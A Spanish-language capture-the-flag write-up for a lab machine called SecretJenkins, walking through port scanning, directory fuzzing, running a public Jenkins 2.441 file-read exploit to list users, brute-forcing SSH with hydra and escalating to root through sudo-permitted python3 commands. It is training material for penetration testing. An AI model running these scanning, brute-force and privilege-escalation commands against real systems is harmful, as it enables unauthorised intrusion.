Maquina: SecretJenkins
Dificultad: Facil
![Logo](Imágenes/2025-05-15_20-59.png)

Se descarga la maquina vulnerable y se descomprime con unzip secretjenkins.zip y se despliega con el comando:  sudo bash auto_deploy.sh secretjenkins.tar
![Despliegue](Imágenes/Capturas.png)

Se realiza un ping -c1 172.17.0.3 para confirmar la conexion de la maquina 
![Ping](Imágenes/Capturas_1.png)

Se realiza scaneo con sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.3 -oG allPorts.txt y se encuentran los puertos:
22 ssh
8080 http
![Puertos](Imágenes/Capturas_2.png)

Con mi script personalisado extractPorts allPorts.txt se extrae los puertos abiertos para usarlo en nmap -sCV -p22,8080 172.17.0.3 -oN target.txt y poder ver versiones
![Servicios](Imágenes/Capturas_3.png)

Al entrar http://172.17.0.3:8080/ podemos ver un registro de login del servicio de Jenkins
![Pagina](Imágenes/Capturas_4.png)

Realizamos fuzzing gobuster dir -u http://172.17.0.3:8080 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -add-slash -b 403,404 -x php,html,txt se encontro varios directorios ocultos revisamos cada uno de ellos para ver si encontramos alguna vulnerabilidad.
Nota: se cae la pagina esto nos siguiere que se podria un ataque DOS o DDOS, al revisar los directorios no encotre nada al ser demasiados directorios
![Fuzzing](Imágenes/Capturas_5.png)

Busque la version de Jenkins con el comando: whatweb 'http://172.17.0.3:8080/' y encontre que esta trabajando en la verison Jenkins[2.441] busque alguna vulnerabilidad con searchsploit jenkins pero no encontre ninguna con esta version
En internet encontre un Jenkins 2.441 - Local File Inclusion https://www.exploit-db.com/exploits/51993 un script en python3 lo copie y lo pegue en un archivo nano local_host_intrusion.py le di permisos chmod +x local_host_intrusion.py y lo ejecute 
python3 local_host_intrusion.py -u http://172.17.0.3:8080
![whatweb](Imágenes/Capturas_6.png)

Luego el script te pedirá rutas de archivos para leer y buscamos archivos como usuarios o contraseñas leemos el /etc/passwd/ encotramos los usuarios de pinguinito, root y bobby 
![sxploit](Imágenes/Capturas_7.png)

Con los usuarios encontrados los puse en nano usuarios.txt para usarlo con hydra y encontrar las credenciales para entrar al servidor SHH ya que con nmap confirmamos que se encutra abierto
hydra -L usuarios.txt -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.3 -t 4 y se encontro las credenciales
[22][ssh] host: 172.17.0.3   login: bobby   password: chocolate
![hydra](Imágenes/Capturas_8.png)

Entre a SSH con las credenciales encontradas y entro como usuario bobby y busco una escalada con sudo -l y econtre (pinguinito) NOPASSWD: /usr/bin/python3 asi que ejecuto: sudo -u pinguinito /usr/bin/python3 -c 'import pty; pty.spawn("/bin/bash")' 
para ser usuario pinguinito
![usuario](Imágenes/Capturas_9.png)

Con sudo -l encontramos que pinguinito  (ALL) NOPASSWD: /usr/bin/python3 /opt/script.py asi que borre el script.py que se encuentra en opt y ejecute echo 'import os; os.system("/bin/bash")' > /opt/script.py para crear un archivo para escalar root
y lo ejecute sudo /usr/bin/python3 /opt/script.py
![usuario](Imágenes/Capturas_10.png)
